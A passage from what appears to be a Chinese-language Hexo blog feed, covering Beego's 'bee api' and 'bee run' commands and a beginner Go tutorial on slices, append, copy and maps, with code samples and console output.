class="headerlink" title="api命令"></a>api命令</h3><h4 id="api命令是用来创建api应用的。"><a href="#api命令是用来创建api应用的。" class="headerlink" title="api命令是用来创建api应用的。"></a>api命令是用来创建api应用的。</h4><pre class=" language-go"><code class="language-go">$ bee api beeg______<span class="token operator">|</span> ___ \<span class="token operator">|</span> <span class="token operator">|</span><span class="token boolean">_</span><span class="token operator">/</span> <span class="token operator">/</span>  ___   ___<span class="token operator">|</span> ___ \ <span class="token operator">/</span> <span class="token boolean">_</span> \ <span class="token operator">/</span> <span class="token boolean">_</span> \<span class="token operator">|</span> <span class="token operator">|</span><span class="token boolean">_</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>  __<span class="token operator">/</span><span class="token operator">|</span>  __<span class="token operator">/</span>\____<span class="token operator">/</span>  \___<span class="token operator">|</span> \___<span class="token operator">|</span> v1<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token number">46</span> INFO     ▶ <span class="token number">0001</span> Creating API<span class="token operator">...</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>conf    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>controllers    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>tests    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>conf<span class="token operator">/</span>app<span class="token punctuation">.</span>conf    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>models    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>routers<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>controllers<span class="token operator">/</span>object<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>controllers<span class="token operator">/</span>user<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>tests<span class="token operator">/</span>default_test<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>routers<span class="token operator">/</span>router<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>models<span class="token operator">/</span>object<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>models<span class="token operator">/</span>user<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>main<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token number">46</span> SUCCESS  ▶ <span class="token number">0002</span> New API successfully created<span class="token operator">!</span></code></pre><pre><code>├── conf│   └── app.conf├── controllers│   ├── default.go│   ├── object.go│   └── user.go├── main.go├── models│   ├── object.go│   └── user.go├── routers│   └── router.go├── static│   ├── css│   ├── img│   └── js│       └── reload.min.js├── tests│   └── default_test.go└── views    └── index.tpl</code></pre><h3 id="run命令"><a href="#run命令" class="headerlink" title="run命令"></a>run命令</h3><h4 id="bee-run命令是监控beego的项目，但是需要注意的是一定需要在自己创建的目录下才可以运行哦。"><a href="#bee-run命令是监控beego的项目，但是需要注意的是一定需要在自己创建的目录下才可以运行哦。" class="headerlink" title="bee run命令是监控beego的项目，但是需要注意的是一定需要在自己创建的目录下才可以运行哦。"></a><code>bee run</code>命令是监控beego的项目，但是需要注意的是一定需要在自己创建的目录下才可以运行哦。</h4><pre class=" language-go"><code class="language-go">$ bee run______<span class="token operator">|</span> ___ \<span class="token operator">|</span> <span class="token operator">|</span><span class="token boolean">_</span><span class="token operator">/</span> <span class="token operator">/</span>  ___   ___<span class="token operator">|</span> ___ \ <span class="token operator">/</span> <span class="token boolean">_</span> \ <span class="token operator">/</span> <span class="token boolean">_</span> \<span class="token operator">|</span> <span class="token operator">|</span><span class="token boolean">_</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>  __<span class="token operator">/</span><span class="token operator">|</span>  __<span class="token operator">/</span>\____<span class="token operator">/</span>  \___<span class="token operator">|</span> \___<span class="token operator">|</span> v1<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">08</span> INFO     ▶ <span class="token number">0001</span> Using <span class="token string">'beeg'</span> as <span class="token string">'appname'</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">08</span> INFO     ▶ <span class="token number">0002</span> Initializing watcher<span class="token operator">...</span>beeg<span class="token operator">/</span>modelsbeeg<span class="token operator">/</span>controllersbeeg<span class="token operator">/</span>routersbeeg<span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11</span> SUCCESS  ▶ <span class="token number">0003</span> Built Successfully<span class="token operator">!</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11</span> INFO     ▶ <span class="token number">0004</span> Restarting <span class="token string">'beeg'</span><span class="token operator">...</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11</span> SUCCESS  ▶ <span class="token number">0005</span> <span class="token string">'./beeg'</span> is running<span class="token operator">...</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11.600</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>parser<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token punctuation">:</span><span class="token number">112</span><span class="token punctuation">]</span>  generate router from comments<span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11.601</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>router<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token punctuation">:</span><span class="token number">269</span><span class="token punctuation">]</span>  <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>controllers no changed<span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token number">11.609</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>asm_amd64<span class="token punctuation">.</span>s<span class="token punctuation">:</span><span class="token number">1333</span><span class="token punctuation">]</span>  http server Running on http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">:</span><span class="token number">8080</span></code></pre><h4 id="打开浏览器访问htttp-127-0-0-1-8080就可以看到内容啦。"><a href="#打开浏览器访问htttp-127-0-0-1-8080就可以看到内容啦。" class="headerlink" title="打开浏览器访问htttp://127.0.0.1:8080就可以看到内容啦。"></a>打开浏览器访问<code>htttp://127.0.0.1:8080</code>就可以看到内容啦。</h4>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言编程</title>
      <link href="/2018/10/30/go-yu-yan-bian-cheng/"/>
      <url>/2018/10/30/go-yu-yan-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Go语言编程"><a href="#Go语言编程" class="headerlink" title="Go语言编程"></a>Go语言编程</h1><h2 id="1-0数组切片"><a href="#1-0数组切片" class="headerlink" title="1.0数组切片"></a>1.0数组切片</h2><h3 id="1-1基于数组"><a href="#1-1基于数组" class="headerlink" title="1.1基于数组"></a>1.1基于数组</h3><p>基于数组我们很好理解，先创建数组再创建切片。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> firstarry <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token builtin">int</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 创建一个数组</span>    <span class="token keyword">var</span> secendarry <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span> <span class="token operator">=</span> firstarry<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 创建一个切片数组</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"This is fist arry :"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> firstarry <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"\nThis is second arry :"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> secendarry <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-bash"><code class="language-bash">$ go run slice.goThis is fist arry <span class="token keyword">:</span>1 2 3 4 5 6 7 8 0 0This is second arry <span class="token keyword">:</span>1 2 3 4 5</code></pre><p>可以看出和python很相似，可以更具自己需要的位置选取，array[start:finall]。  </p><h3 id="1-2直接创建"><a href="#1-2直接创建" class="headerlink" title="1.2直接创建"></a>1.2直接创建</h3><p>Go内置函数make()可以直接创建数组切片。<br>创建初始元素个数为5的数组切片   </p><pre class=" language-go"><code class="language-go">myslice <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span></code></pre><p> 创建一个初始元素个数为5且预留了10个元素的储存空间</p><pre class=" language-go"><code class="language-go">myslice <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span></code></pre><p>直接创建一个初始化元素为5的数组切片</p><pre class=" language-go"><code class="language-go">myslice <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    myslice <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"myslice len:"</span><span class="token punctuation">,</span><span class="token function">len</span><span class="token punctuation">(</span>myslice<span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"myslice cap:"</span><span class="token punctuation">,</span><span class="token function">cap</span><span class="token punctuation">(</span>myslice<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// myslice := []int{1, 2, 3, 4, 5, 6}</span>    <span class="token comment" spellcheck="true">// fmt.Println("myslice len:", len(myslice))</span>    <span class="token comment" spellcheck="true">// fmt.Println("myslice cap:", cap(myslice))</span>    <span class="token comment" spellcheck="true">//myslice := make([]int, 5)</span>    <span class="token comment" spellcheck="true">//fmt.Println("myslice len:", len(myslice))</span>    <span class="token comment" spellcheck="true">//fmt.Println("myslice cap:", cap(myslice))</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run slice1<span class="token punctuation">.</span><span class="token keyword">go</span>myslice <span class="token builtin">len</span><span class="token punctuation">:</span> <span class="token number">5</span>myslice <span class="token builtin">cap</span><span class="token punctuation">:</span> <span class="token number">10</span>  myslice <span class="token builtin">len</span><span class="token punctuation">:</span> <span class="token number">6</span>myslice <span class="token builtin">cap</span><span class="token punctuation">:</span> <span class="token number">6</span>  myslice <span class="token builtin">len</span><span class="token punctuation">:</span> <span class="token number">5</span>myslice <span class="token builtin">cap</span><span class="token punctuation">:</span> <span class="token number">5</span></code></pre><h3 id="1-3动态增减元素"><a href="#1-3动态增减元素" class="headerlink" title="1.3动态增减元素"></a>1.3动态增减元素</h3><p>我们可以利用append()对数组切片进行新增元素。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    myslice <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"myslice len:"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>myslice<span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"myslice cap:"</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>myslice<span class="token punctuation">)</span><span class="token punctuation">)</span>    newslice <span class="token operator">:=</span> <span class="token function">append</span><span class="token punctuation">(</span>myslice<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> newslice <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"\nnewslice len:"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>newslice<span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"newslice cap:"</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>newslice<span class="token punctuation">)</span><span class="token punctuation">)</span>    myslice2 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// fmt.Println("myslice2 len:",len(myslice))</span>    <span class="token comment" spellcheck="true">// fmt.Println("myslice2 cap:",cap(myslice))</span>    myslice3 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// fmt.Println("myslice3 len:", len(myslice))</span>    <span class="token comment" spellcheck="true">// fmt.Println("myslice3 cap:", cap(myslice))</span>    myslice4 <span class="token operator">:=</span> <span class="token function">append</span><span class="token punctuation">(</span>myslice2<span class="token punctuation">,</span>myslice3<span class="token operator">...</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"\nmyslice4 len:"</span><span class="token punctuation">,</span><span class="token function">len</span><span class="token punctuation">(</span>myslice4<span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"myslice4 cap:"</span><span class="token punctuation">,</span><span class="token function">len</span><span class="token punctuation">(</span>myslice4<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> x <span class="token operator">:=</span> <span class="token keyword">range</span> myslice4 <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run <span class="token builtin">append</span><span class="token punctuation">.</span><span class="token keyword">go</span>myslice <span class="token builtin">len</span><span class="token punctuation">:</span> <span class="token number">5</span>myslice <span class="token builtin">cap</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span>newslice <span class="token builtin">len</span><span class="token punctuation">:</span> <span class="token number">9</span>newslice <span class="token builtin">cap</span><span class="token punctuation">:</span> <span class="token number">10</span>myslice4 <span class="token builtin">len</span><span class="token punctuation">:</span> <span class="token number">11</span>myslice4 <span class="token builtin">cap</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span></code></pre><p>利用append（）将会在原数组后面新增元素。原数组长度为5，新增了1，2，3，4所以长度变成了9。两个数组append在一起时，一定不能缺少那个省略号，否则会编译失败。</p><h3 id="1-4基于数组切片创建数组切片"><a href="#1-4基于数组切片创建数组切片" class="headerlink" title="1.4基于数组切片创建数组切片"></a>1.4基于数组切片创建数组切片</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    oldslice <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span>    newslice <span class="token operator">:=</span> oldslice<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> newslice <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run slice2<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span></code></pre><h3 id="内容复制"><a href="#内容复制" class="headerlink" title="内容复制"></a>内容复制</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    slice1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span>    slice2 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span>    <span class="token function">copy</span><span class="token punctuation">(</span>slice1<span class="token punctuation">,</span> slice2<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"slice1:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> slice1 <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// copy(slice2, slice1)</span>    <span class="token comment" spellcheck="true">// fmt.Println("\nslice2:")</span>    <span class="token comment" spellcheck="true">// for _, x := range slice2 {</span>    <span class="token comment" spellcheck="true">//     fmt.Print(x, " ")</span>    <span class="token comment" spellcheck="true">// }</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run <span class="token builtin">copy</span><span class="token punctuation">.</span><span class="token keyword">go</span>slice1<span class="token punctuation">:</span><span class="token number">5</span> <span class="token number">4</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span>把<span class="token function">copy</span><span class="token punctuation">(</span>slice1<span class="token punctuation">,</span>slice2<span class="token punctuation">)</span>一下内容注释后slice2<span class="token punctuation">:</span><span class="token number">1</span> <span class="token number">2</span></code></pre><h5 id="我们可以看出，copy不会改变array的大小。"><a href="#我们可以看出，copy不会改变array的大小。" class="headerlink" title="我们可以看出，copy不会改变array的大小。"></a>我们可以看出，copy不会改变array的大小。</h5><h2 id="2-0-map"><a href="#2-0-map" class="headerlink" title="2.0 map"></a>2.0 map</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">type</span> PersonInfo <span class="token keyword">struct</span> <span class="token punctuation">{</span>    ID      <span class="token builtin">string</span>    Name    <span class="token builtin">string</span>    Address <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> PersonInfoDB <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>PersonInfo    PersonInfoDB <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>PersonInfo<span class="token punctuation">)</span>    PersonInfoDB<span class="token punctuation">[</span><span class="token string">"1234"</span><span class="token punctuation">]</span> <span class="token operator">=</span> PersonInfo<span class="token punctuation">{</span><span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"FUN"</span><span class="token punctuation">,</span> <span class="token string">"shanghai"</span><span class="token punctuation">}</span>    PersonInfoDB<span class="token punctuation">[</span><span class="token string">"12"</span><span class="token punctuation">]</span> <span class="token operator">=</span> PersonInfo<span class="token punctuation">{</span><span class="token string">"12"</span><span class="token punctuation">,</span> <span class="token string">"kali"</span><span class="token punctuation">,</span> <span class="token string">"shanghai"</span><span class="token punctuation">}</span>    person<span class="token punctuation">,</span> ok <span class="token operator">:=</span> PersonInfoDB<span class="token punctuation">[</span><span class="token string">"1234"</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> ok <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Find person"</span><span class="token punctuation">,</span> person<span class="token punctuation">.</span>ID<span class="token punctuation">,</span>person<span class="token punctuation">.</span>Name<span class="token punctuation">,</span>person<span class="token punctuation">.</span>Address<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> person<span class="token punctuation">.</span>Name<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run <span class="token keyword">map</span><span class="token punctuation">.</span><span class="token keyword">go</span>Find person <span class="token number">1234</span> FUN shanghai</code></pre><h4 id="2-1声明变量"><a href="#2-1声明变量" class="headerlink" title="2.1声明变量"></a>2.1声明变量</h4><pre class=" language-go"><code 